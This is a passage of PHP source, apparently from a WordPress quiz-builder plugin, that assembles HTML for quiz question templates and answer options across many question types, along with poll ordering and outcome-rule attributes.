								$backbutton_data = '<div class="single_back_btn sqb_back_btn" style="display: inline-block; border-radius: 5px; background: #000000; color: #ffffff; height: auto; padding: 12px 15px; font-family: &quot;DM Sans&quot;, sans-serif; min-width: 90px; box-shadow: none; margin: 0px; text-decoration: none; line-height: normal; border: none; text-align: center; text-transform: initial; font-size: 16px; font-weight: 600; width: 100px; max-width: 100%; cursor: pointer; float: none; position: relative;"><div>Back</div></div>';	
							}
						}

						//$skip_button = '<div class="skip-question-action"><div class="skip-question-btn single_next_btn sqb_next_btn"><div>Skip Question</div></div></div>';
						$buttondata_inn = '<div class="skip_continue_button_wrapper">'.$backbutton_data.$skip_button.$continue_button.'</div>';
					}
					
					$style_new_questions_top_border_cls='';
					$style_new_questions_top_border='';
					if($lesson_id !='' &&  $quiz_pagination =="all"){
						
						$questions_top_border_setting_arr = explode("||",$questions_top_border_setting);
						$questions_top_border_sett = $questions_top_border_setting_arr[0];
						$questions_top_border = $questions_top_border_setting_arr[1];
						$questions_top_border_default ="#4f6cbf";
						 
						if($questions_top_border_sett =="Y"){
							if($questions_top_border =="" || $questions_top_border == null || $questions_top_border =="undefined"){
								$questions_top_border = $questions_top_border_default;
							}
							$style_new_questions_top_border_cls = " questions_top_border_cls ";
							$style_new_questions_top_border = "<style> .questions_top_border_cls{border-top:5px solid ".$questions_top_border." !important}</style>";
						}
					}
					
  
					/*$skipped_btn = "";					
					if( $quiz_pagination =="all"){
						if($allow_skip_ques =="Y"){
							//$skipped_btn = sqbGetValidSettingsByKey('skip_question_btn_html');
							if(isset($skipped_btn) && $skipped_btn != ''){
								$skipped_btn = stripslashes($skipped_btn);
							}else{
								$skipped_btn = '<button class=" skipped_btn " style=" display: inline-block;">Skip Question</button>';
							}	
						}
					}	*/
					
					$quiz_template_class = '';
					if($template_num == 'template5'){
						
						$question_data_buttondata_inn = '<div class="Quiz-Template5-inner" style="min-height: '.$quiz_temp_heights.'"><div class="Quiz-Template5-left-side '.$sqb_start_screen_background_image.'" style="'.$left_side_bar_style.';">'.$background_image_div.'<p class="sqb_question_progress"><strong style="color:'.$progress_bar_color.';">'.$ques_count.'/'.$totalques.'</strong></p>'.stripslashes($question).'</div><div class="Quiz-Template5-right-side" style="background-color: '.$quiz_temp_right_bgcolor.';"><div class="Quiz-Template5-right-inner">'.$answerdata.' '.$buttondata_inn.'</div></div></div>';	
						$quiz_template_class = 'Quiz-Template-5';
						$progressbar_html = $progressbar;
						
					} else if($template_num == 'template7'){

						$question_data_buttondata_inn = $question_data.$buttondata_inn;
						$progressbar_html = $progressbar.'<p class="sqb_question_progress"><strong>'.$ques_count.' / '.$totalques.'</strong></p>';
						
					} else {
						$question_data_buttondata_inn = $question_data.$buttondata_inn;
						$progressbar_html = $progressbar;
					}	
					
					//for default 
					 if($temp_wid=="100%"){
						 $temp_wid = 700;
					 } 
					 $quiz_temp_start = "";	
					$quiz_temp_end = "";	
					if($template_num == 'template4'){
						$question_customizer = $sqbquestionobj->getTempCustomizer();
						$question_customizer_array = explode("||",$question_customizer);
						$question_style = '';
						if(isset($question_customizer_array[0])){
							$question_max_width = $question_customizer_array[0];
							$question_style = "style='max-width:".$question_max_width."'";
						}
					 
						$quiz_temp_start = '<style>.quiz_quesans_template_outer .Quiz-Template  .outer-style3-inner{border-style:'.$q_border_style.';border-color:'.$q_border_color.';border-width:'.$q_border_wid.'px;}.quiz_quesans_template_outer .Quiz-Template  .outer_style3_new{border-top-color:'.$top_bg_color.'}.quiz_quesans_template_outer .outer-style3::before, .quiz_quesans_template_outer  .outer-style3::after{border-color:'.$top_bg_color.' transparent transparent;}</style><div class="outer-style3 outer_style3_new "'.$question_style.' style="display:none;border-top-color:'.$top_bg_color.'"><span class="outer_style3_span_first" style="border-color:'.$top_bg_color.' transparent transparent"></span><span style="border-color:'.$top_bg_color.' transparent transparent" class="outer_style3_span_second"></span><div class="outer-style3-inner">';	
						$quiz_temp_end = "</div></div>";	
					}
					
					$questions_style = 'style="max-width: 700px !important; background-color: rgb(255, 255, 255); "';
					if($template_num == 'template2'){	
						$quiz_temp_cls =' outer-style1 ';					 
					}else if($template_num == 'template3'){						 
						$quiz_temp_cls =' outer-style2 ';
					}else if($template_num == 'template7'){						 
						$quiz_temp_cls =' outer-style7 ';
					}else if($template_num == 'template8'){						 
						$quiz_temp_cls =' outer-style8 ';
						$questions_style = 'style="background-color: transparent;border: none;"';
					}else{
						$quiz_temp_cls =' ';
					}
					
					//for calculator
					$cal_ques_class ="";
					$data_ques_name ="";
					if($quiz_type =="calculator"){	
						if($question_type == "multi" || $question_type == "single" || $question_type == "yes_no" || $question_type == "slider" || $question_type == "numerical_text" || $question_type == "matching_text" || $question_type == "weight_and_height"){
							$cal_ques_class =" sqb_formula_ques_div ";
							$data_ques_name ='Q'.$q;
						}
					}
					if( $question_type == "single"  ){
						$question_type_cls = $question_type.'_cls_div';
					}else{
						$question_type_cls = $question_type.'_cls';
					}

					$questiondata .= '<div class=" Quiz-Template '.$quiz_temp_cls.' '.$display_ques_div.' '.$style_new_questions_top_border_cls.' '.$quiz_template_class.' '.$cal_ques_class.' '.$question_type_cls.'"  data-category-id="'.$question_catgory_id.'"  id="quiz_temp_id'.$question_id.'"  data-question-id="'.$question_id.'" data-Quesformula-name="'.$data_ques_name.'" '.$questions_style.'>'.$quiz_temp_start.$progressbar_html.'<div class="Quiz-Template-overflow" ><div class="question_type_'.$question_type.'    question_container '.$muli_or_single_cls.' '.$display_ques_div.' '.$single_fillin_text.' '.$disable_nextbutton.$multiple_correct_cls.' '.$quiz_pagination_cls.'" id="question_id_'.$question_id.'" data-question-id="'.$question_id.'"  >'.$question_data_buttondata_inn.'<input type="hidden" class="sqb_quiz_next_button_click" autocomplete="off" id="next_button_click'.$question_id.'"  name="next_button_click'.$question_id.'" value="0" /><input type="hidden" class="temp_wid" id="temp_wid'.$question_id.'"  name="temp_wid'.$question_id.'" value="'.$temp_wid.'" /><input type="hidden" class="allow_skip_ques" id="allow_skip_ques'.$question_id.'"  name="allow_skip_ques'.$question_id.'" value="'.$allow_skip_ques.'" /><input type="hidden" class="skip_mapping_cls" id="skip_mapping'.$question_id.'"  name="skip_mapping'.$question_id.'" value="'.$skip_mapping.'" />'.$quiz_pagination_divider.$getlesonstyle.'</div></div>'.$quiz_temp_end.$recommendation_html.$ads_html_content.'</div>';	
					$q++;						 
				} 
			
			}
		} //endforeach 
	}		
	
		$already_taken_quiz_outer_data='';	 
		$required_answer = sqbGetValidSettingsByKey('pick_ans_msg');
		if($required_answer == ""){
			$required_answer  = 'Please pick an answer.';
		}
		
		$already_taken_quiz = sqbGetValidSettingsByKey('already_taken_quiz'); 
		if($already_taken_quiz == ""){
			$already_taken_quiz = 'You have already taken this quiz. See results below.';
		}
		if($lesson_id !=''){
			 $already_taken_quiz_outer_data = '<div class="already_taken_quiz_outer" style=" display:none;">'.$already_taken_quiz.'</div>';			 
		}

		$form_autocomplete = '';
		$form_autoclose = '';
		if (isset($_SERVER['HTTP_USER_AGENT'])) {
		    $agent = $_SERVER['HTTP_USER_AGENT'];

		    if (strlen(strstr($agent, 'Firefox')) > 0) {
		    	$form_autocomplete = '<form autocomplete="off">';
		    	$form_autoclose = '</form>';
		    }
		}

		$poll_hidden = '';
		if($quiz_type == 'poll'){
			$show_results = sqb_get_param($quizid,'show_results');

			$show_results = ($show_results == 'same-screen' || $show_results == '') ? 'N' : 'Y';

			$poll_hidden = '<input type="hidden" id="poll_redirect" value="'.$show_results.'" />';
		}

		$hidden_fields_data = $form_autocomplete.'<input type="hidden" id="sqb_quiz_current_page_id" value="'.get_the_ID().'"/><input type="hidden" id="quiz_id" value="'.$quizid.'"/>
		<input type="hidden" id="user_id" value=""/><input type="hidden" id="platform" value=""/><input type="hidden" id="total_ques" value="'.$totalques.'"/><input type="hidden" id="percentage" value="0"/><input type="hidden" id="ques_count" value="0"/><input type="hidden" id="points_count" value="0"/> <input type="hidden" id="required_answer" value="'.$required_answer.'"/> <input type="hidden" id="ques_count_progress" value="0"/>'.$form_autoclose.$already_taken_quiz_outer_data.$poll_hidden;
		
	}
	
	$buttondata_outer1 = '<div class="buttondata_outer '.$multiple_ques_true.'">'.$retakedata.$buttondata_outer.'</div>';
	return $hidden_fields_data.$questiondata.$buttondata_outer1.$settings_data.$style_new_questions_top_border.$styleformatrix;	 
}



//get the answers 
function sqbGetAnswers($quizid, $quiz_type, $question_id, $ques_template, $question_type, $branching, $multiple_correct , $answers_random, $course_id,$lesson_id, $dap_id, $file_upload_settings,$max_file_upload_size,$matrix_label_text,$matrix_html){
	
	$recommendation_html = '';
	$answerdata= "";
	$add_correctcls=" ";
	$skip_optin = "";
	$ans_id_array= array();
	$answersdataobj =  SQB_QuizAnswers::loadByQuestionId($question_id);	 
	
	if(isset($answersdataobj)){
		foreach($answersdataobj as $answerdataobj) {
			$ans_id_array[] = $answerdataobj->getId();
		}
		
	}
	
	//randomize the answer if  answers_random is set to Y
	if($answers_random =="Y"){
		shuffle($ans_id_array);
	}

	if($quiz_type == 'poll'){
		$answer_order = sqb_get_param($quizid,'answer_order');
		
		if($answer_order == 'order-most-votes-on-top'){

			$result = get_poll_results($quizid);

			if(!empty($result)){
				$ans_id_array = array();
				$cnt  = array_column($result, 'cnt');
				array_multisort($cnt, SORT_DESC, $result);

			/*echo '<pre>';
			print_r($result);
			exit;*/

				foreach ($result as $key => $row) {
					$ans_id_array[] = $row['answer_given'];
				}

			}
		}elseif($answer_order == 'order-random'){
			shuffle($ans_id_array);
		}
	}

	
	$correct_incorrect_info  = '';
	$hw_validate_message = '';
	if(isset($ans_id_array)){
		$iteration = 1;
		foreach($ans_id_array as $ans_id_arr) {			
			$answerdataobj = SQB_QuizAnswers::loadById($ans_id_arr);	
			  
			//if(isset($answerdataob)){
				 
				$ans_id = $answerdataobj->getId();
				$answer = $answerdataobj->getAnswer();
				$answer_tags = $answerdataobj->getTagIds();
				$answer_tags_attr = "data-answer-tags='".$answer_tags."'";
				$correct_answer = $answerdataobj->getCorrectAnswer();  
				$answer_points = stripslashes($answerdataobj->getAnswerPoints()); 
				$incorrect_answer_info = $answerdataobj->getIncorrectAnswerInfo(); 
				$incorrect_answer_info = str_replace("'", "`", $incorrect_answer_info);
				$correct_answer_info = stripslashes($answerdataobj->getCorrectAnswerInfo());  	
				$correct_answer_info = str_replace("'", "`", $correct_answer_info);
				$extra_param = $answerdataobj->getExtraOptions(); 	
				$answer_order = $answerdataobj->getAnswerOrder(); 		
				$answerdataobj->getRecommendationHtml();
				$numeric_correct_answer = '';

				$extra_op = maybe_unserialize($answerdataobj->getExtraOptions());
				
				$phone_err = '';
				$phone_required_field = '';
				$phone_selected_country = '';

				if(!empty($extra_op)){

					$email_options = !empty($extra_op['email_options']) ? $extra_op['email_options'] : array();
					$email_err = !empty($email_options['validation_message']) ? $email_options['validation_message'] : '';
					$email_required_field = !empty($email_options['required_field']) ? $email_options['required_field'] : '';
					
					$phone_options = !empty($extra_op['phone_options']) ? $extra_op['phone_options'] : array();

					$phone_selected_country = !empty($phone_options['selected_country']) ? $phone_options['selected_country'] : '';
					$phone_required_field = !empty($phone_options['required_field']) ? $phone_options['required_field'] : '';
					$phone_err = !empty($phone_options['validation_message']) ? $phone_options['validation_message'] : '';
					

				}else{
					$email_err = '';
					$email_required_field = '';
				}

				$matching_values = array();
				
				if(!empty($extra_param)){
					$extra_param = maybe_unserialize($extra_param);
					
					
					$numeric_correct_answer = !empty($extra_param['numeric_correct_answer']) ? $extra_param['numeric_correct_answer'] : '';
					$matching_values = !empty($extra_param['matching_text']) ? $extra_param['matching_text'] : array();

					$hw_options = !empty($extra_param['hw_options']) ? $extra_param['hw_options'] : '';

					$hw_validate_message = !empty($hw_options['validation_message']) ? $hw_options['validation_message'] : '';
				}

				$recommendation_db = stripslashes($answerdataobj->getRecommendationHtml()); 		
				
				$recommendation_enable = 'Y'; 		
				$recommendation_enable_class = ' ';
				if($recommendation_enable == 'Y'){
					$recommendation_enable_class = ' ans_recommendation_enable ';
				}
				
				if($recommendation_db != ''){
					$sqbObj =  SQB_Quiz::loadById($quizid);    
					$recommendation_next_btn = '';
					if(isset($sqbObj) && $sqbObj){
						$recommendation_next_btn = stripslashes($sqbObj->getRecommendedNextButton()); 
					}
					
					$recommendation_db = $recommendation_db."<div class='sqb_cr_next_btn_div'>".$recommendation_next_btn."</div>";
				}
				$recommendation_html .= "<div class='quiz_ans_recommendation_html' style='display:none'>".$recommendation_db."</div>";
							 
				//load outcome			 
				$loadoutcomemappingobj = SQB_OutComeMapping::loadByQuizIdQuestionIdAnsId($quizid, $question_id, $ans_id);
				 
				$data_outcome_attr="";
				if(isset($loadoutcomemappingobj)){		
					$question_id =  $loadoutcomemappingobj->getQuestionId();
					$answer_id =  $loadoutcomemappingobj->getAnswerId();
					$outcome_id =  $loadoutcomemappingobj->getOutcomeId();
					$data_outcome_attr = ' data-outcome-ids="'.$outcome_id.'"'; 
				}//end isset		
			 
			   
				if($answer !="" || $answer != null){
					 if($correct_answer =="true"){
						$add_correctcls =" correct_ans_cls ";
					}else{
						$add_correctcls =" ";
					}
 
					//check if lesson id is set 
					//$lesson_id = $_SESSION['current_lesson_id']; 
					$answer_picked =false; 
					$sqb_ans_selected =""; 
					$sqb_ans_checked =""; 
					$picked_answer_text =""; 
					if($lesson_id !=""){
						//$dap_id = $_SESSION['dap_id'] ;	
						$answer_picked = sqb_user_question_answerdata($quizid, $dap_id, $question_id, $ans_id, $course_id, $lesson_id);
						$picked_answer_text = sqb_user_question_answer_text($quizid, $dap_id, $question_id, $ans_id, $course_id, $lesson_id);
						 
						if($answer_picked == true){
							$sqb_ans_selected = " sqb_ans_selected ";
							$sqb_ans_checked = " checked  ";
						}						
					}	
					
					//added for advanced_rule
					
					$outcome_id_linked = 0;		
					$skip_quiz = 'N';		
					$skip_optin = 'N';	
					if($question_type == "multi" || $question_type == "single" || $question_type == "yes_no"){ 	

						

						//$rule_data_all = SQB_AdvancedRule::loadByQuizId($quizid);	
						$rule_data_all = SQB_AdvancedRule::loadByQuizIdAndQuesAnsId($quizid, $question_id, $ans_id);	
						global $wpdb;
						/*echo $wpdb->last_query;
						echo "\n";*/

						/*echo "<pre>";
						echo $wpdb->last_query;
						print_r($rule_data_all);
						echo "</pre>Over";*/



						if(($rule_data_all) && count($rule_data_all)){
							$outcome_id_linked = 0;
							$skip_quiz = 'N';
							$skip_optin = 'N';
							foreach($rule_data_all as $rule_data){
								
								$r_id = $rule_data->getId();
								$question_id = $rule_data->getQuestionId();
								$answers_id = $rule_data->getAnswersId();
								//echo $question_id.' : '.$answer_id.'<br />';
								$oid = $rule_data->getOutcomeId();
								$skip_optin = $rule_data->getSkipOptin();
								$skip_quiz = $rule_data->getSkipQuiz();
								$enabled_category_advanced = $rule_data->getEnabledAdvanced();
								if($enabled_category_advanced =="Y"){
									if($answers_id !=""){			 
										$answersid_arr = explode(",",$answers_id);	
										/*echo "<pre>";
										print_r($answersid_arr);
										echo "</pre>";*/
										if(in_array($ans_id, $answersid_arr)){	 													 
											$outcome_rule='yes' ;
											$outcome_id_linked = $oid;
											//continue;
										}
									}	
								}	
							}
						}
					}
					$data_advanced_id = ' data-outcomerule-id = "'.$outcome_id_linked.'" data-skipoptin-id = "'.$skip_optin.'" id = "sqb_ans_id'.$ans_id.'"'.'data-continuequiz = "'.$skip_quiz.'"';
					
					//echo $data_advanced_id.'<br />';

					//check if quiz_type = survey
					if($quiz_type == "survey"  || $quiz_type == "calculator"){
						if($question_type == "multi"){ 								  
							$answer_html =   '<div class="sqb_ans_item_outer single_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' '.$data_advanced_id.'>'.$answer.'</div>';
						 
						}else if($question_type == "text"){
							$answer_html = '<div class="sqb_ans_item_outer text_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
						}else if($question_type == "email"){
							
							$answer_html = '<div class="sqb_ans_item_outer email_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" data-emailmessage="'.$email_err.'" data-isreq="'.$email_required_field.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
								
						}else if($question_type == "date"){
							$answer_html = '<div class="sqb_ans_item_outer date_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
							
						}else if($question_type == "slider"){
							$answer_html = '<div class="sqb_ans_item_outer slider_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
							
						}else if($question_type == "fill_in_blank"){
							$answer_html = '<div class="sqb_ans_item_outer fill_in_blank_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div> ';
							
						}else if($question_type == "file_upload"){
							$answer_html = '<div class="sqb_ans_item_outer file_upload_cls '.$add_correctcls.$sqb_ans_selected.'" data-id="1" id="file'.$question_id.'" data-sqb-max-upload-size="'.$max_file_upload_size.'" data-allowed-types-of-file="'.$file_upload_settings.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' data-fileurl="" >'.$answer.'</div>';
						}else if($question_type == "ranking_choices"){
							$answer_html = '<div class="sqb_ans_item_outer ranking_choices correct_ans_cls sqb_ans_selected" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-answer="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' ><input style="display:none" type="checkbox" class="custom-checkbox-input sqb_and_field checkbox_fe" data-id="'.$ans_id.'"  data-id="'.$ans_id.'"  id="ans_id_'.$ans_id.'" name="sqb_ans" '.$data_outcome_attr.' '.$sqb_ans_checked.' checked="checked">'.$answer.'</div>'; 	
						}else if($question_type == "numerical_text"){
							$answer_html = '<div class="sqb_ans_item_outer numeric_text_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-correct-value="'.$numeric_correct_answer.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
						}else if($question_type == "weight_and_height"){
							$answer_html = '<div class="sqb_ans_item_outer weight_and_height_cls '.$recommendation_enable_class.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' '.$data_advanced_id.' '.$answer_tags_attr.'>'.$answer.'</div>';
						}else if($question_type == "phone_number"){
							$answer_html = '<div class="sqb_ans_item_outer phone_number_text_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" data-validation="'.$phone_required_field.'" data-errormessage="'.$phone_err.'" data-country="'.$phone_selected_country.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
						
						} else {
							$answer_html = '<div class="sqb_ans_item_outer single_cls '.$recommendation_enable_class.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' '.$data_advanced_id.' '.$answer_tags_attr.'>'.$answer.'</div>';
						}
					}else{ // if quiz_type != survey
						 
						if($question_type == "text"){
							$answer_html = '<div class="sqb_ans_item_outer text_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
						}else if($question_type == "email"){
							
							$answer_html = '<div class="sqb_ans_item_outer email_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" data-emailmessage="'.$email_err.'" data-isreq="'.$email_required_field.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
						
						}else if($question_type == "date"){
							$answer_html = '<div class="sqb_ans_item_outer date_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
						}else if($question_type == "slider"){
							$answer_html = '<div class="sqb_ans_item_outer slider_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
						} else if($question_type == "file_upload"){

							$answer_html = '<div class="sqb_ans_item_outer file_upload_cls '.$add_correctcls.$sqb_ans_selected.'" data-id="1" id="file'.$question_id.'" data-sqb-max-upload-size="'.$max_file_upload_size.'" data-allowed-types-of-file="'.$file_upload_settings.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' data-fileurl="" >'.$answer.'</div>';
						}else if($question_type == "ranking_choices"){
							$answer_html = '<div class="sqb_ans_item_outer ranking_choices correct_ans_cls sqb_ans_selected" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-answer="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' ><input style="display:none" type="checkbox" class="custom-checkbox-input sqb_and_field checkbox_fe" data-id="'.$ans_id.'"  data-id="'.$ans_id.'"  id="ans_id_'.$ans_id.'" name="sqb_ans" '.$data_outcome_attr.' '.$sqb_ans_checked.' checked="checked">'.$answer.'</div>'; 	
						}else if($question_type == "numerical_text"){
							$answer_html = '<div class="sqb_ans_item_outer numeric_text_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-correct-value="'.$numeric_correct_answer.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
						}else if($question_type == "phone_number"){
							$answer_html = '<div class="sqb_ans_item_outer phone_number_text_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" data-validation="'.$phone_required_field.'" data-errormessage="'.$phone_err.'" data-country="'.$phone_selected_country.'" '.$data_outcome_attr.' >'.$answer.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
						}else if($question_type == "weight_and_height"){
							$answer_html = '<div class="sqb_ans_item_outer weight_and_height_cls '.$recommendation_enable_class.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' '.$data_advanced_id.' '.$answer_tags_attr.'>'.$answer.'</div>';
						}else{								
							$answer_html = '<div class="sqb_ans_item_outer single_cls '.$recommendation_enable_class.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' '.$data_advanced_id.' '.$answer_tags_attr.'>'.$answer.'</div>'; 		
						}						 
						
					}


					if($question_type == "matching_text"){
						
						preg_match_all('#\[(.*?)\]#', $answer, $match);

						if(!empty($matching_values)){

							$matching_values_index = $matching_values;
							array_multisort( array_column($matching_values_index, "correct_display"), SORT_ASC, $matching_values_index );

							foreach ($matching_values_index as $key => $value) {
								
								$corr_index = $value['correct_display'];
								$point = $value['point'];
								$name = $value['name'];
								
								$answer = str_replace('['.$name.']',"<div class=\"drag-container\"><div class=\"sqb-match-box\" data-match='".$corr_index."' data-point='".$point."' data-index='drop-".$key."' data-value='".$name."'></div></div>",$answer);
							}
						}

						//$text = preg_replace("#\[(.*?)\]#", "<div class=\"box4\" data-index='drop-1'>$1</a>", $answer);


						//$answer = '<div class="drag-container">'.$answer.'</div>';
						
						

						$drop_values = '<div class="sqb-match-drag-wrapper">';
						foreach ($matching_values as $key => $value) {
							$corr_index = $value['correct_display'];
							$point = $value['point'];
							$drop_values .= '
								<div id="sqb-match-drag-'.$key.'" class="drag-container">
									<div id="di21-'.$key.'" class="sqb-match-item di1" data-match="'.$corr_index.'" data-point="'.$point.'"  data-index="drag-'.$key.'" data-value="'.$value['name'].'">
										'.$value['name'].'
									</div>
								</div>';
						}
						$drop_values .= '</div>';
						$answer .= $drop_values;
						
						$answer_html = '<div class="sqb_ans_item_outer matching_text '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-correct-value="'.$numeric_correct_answer.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$answer.'</div>';
					}
					
					if($question_type == "dropdown"){
					$sqb_dropdown_data = getDropdownData($question_id, $ans_id);
					$sqb_dropdown_html = '<p>Dropdown HTML Goes Here.</p>';
					$answer_html = '<div class="sqb_ans_item_outer dropdown_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$sqb_dropdown_data.'<input type="hidden" class="picked_answer_text" id="picked_answer_text'.$ans_id.'" value="'.$picked_answer_text.'"/></div>';
					 $answer_html = $answer_html;
					}
					
					$answer_html1 = '';
					if($question_type == "matrix" && $iteration == 1){
						$matrix_data = getMatrixDataOuter($question_id, $ans_id, $matrix_label_text,$matrix_html);	
						$answer_html1 = $matrix_data; 
					}
					$answer_html2 = '';
					if($question_type == "matrix"){	
							
						$matrix_data_inner = getMatrixDataInner($question_id, $ans_id,  $matrix_label_text);	
						$answer_html2 =  '<tr class="sqb_ans_item_outer matrix_cls '.$add_correctcls.$sqb_ans_selected.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' >'.$matrix_data_inner.'</tr>';					
					}
					$answer_html3 = '';
					if($iteration == count($ans_id_array)) {
						$matrix_data = getMatrixDataEnd();	
						$answer_html3 = $matrix_data;
					}
					
					if($question_type == "matrix"){
					 $answer_html = $answer_html1.$answer_html2.$answer_html3;
					}
					  
					//check if multiple_correct ans is set to yes
					if($multiple_correct =="Y" && ($question_type == "multi")){						
						$answer_html = '<div class="multiple_correct_checkbox tst sqb_ans_item_outer multiple_cls sqb_withoutradio '.$recommendation_enable_class.$add_correctcls.'" data-point="'.$answer_points.'" data-answer-id="'.$ans_id.'" data-question-id="'.$question_id.'" '.$data_outcome_attr.' '.$answer_tags_attr.' '.$data_advanced_id.' id="sqb_ans_id'.$ans_id.'">	<div class="checkbox-custom-style"><input type="checkbox" class="custom-checkbox-input sqb_and_field checkbox_fe" data-id="'.$ans_id.'"  data-id="'.$ans_id.'"  id="ans_id_'.$ans_id.'" name="sqb_ans" '.$data_outcome_attr.' '.$sqb_ans_checked.'><span class="custom--checkbox"></span></div> '.$answer.'</div>';
					}
					
										 
					//} // branching or normal  end
					
				}else{
					$answer_html ="";
				}
				
				$correct_incorrect_info = "<input type='hidden' class='correct_answer_msg' id='correct_answer_msg".$question_id."' value='".$correct_answer_info."'/>
				<input type='hidden' class='incorrect_answer_msg'  id ='incorrect_answer_msg".$question_id."' value='".$incorrect_answer_info."'/>
				<input type='hidden' class='hw_incorrect_answer_msg'  id ='hw_incorrect_answer_msg".$question_id."' value='".$hw_validate_message."'/>
				";
				 
				$answer_data = $answer_html;	
				$answerdata .=  $answer_data ;	
			//}//isset 
			$iteration++;	
		} //endforeach 
	}
	if($recommendation_html != ''){
		$recommendation_html = "<div class='quiz_ans_recommendation_html_outer'>".$recommendation_html."</div>";
	}
	 
	//return $answerdata.$correct_incorrect_info;
	$output = array();
	$output['answerdata'] = $answerdata.$correct_incorrect_info;
	$output['recommendation_html'] = $recommendation_html;
	return $output;
}

function getDropdownData($question_id, $ans_id){
	$dropdown_html = '';
	$question_data = SQB_QuizQuestionBank::loadById($question_id);
	if(isset($question_data) && !empty($question_data)){
		$question_setting = maybe_unserialize($question_data->getQuestionSetting());
		$dropdown_html .= "<div class='sqb_dropdown_question_section'>";
		$dropdown_html .= "<label>".urldecode($question_setting['dropdown_label'])."</label>";
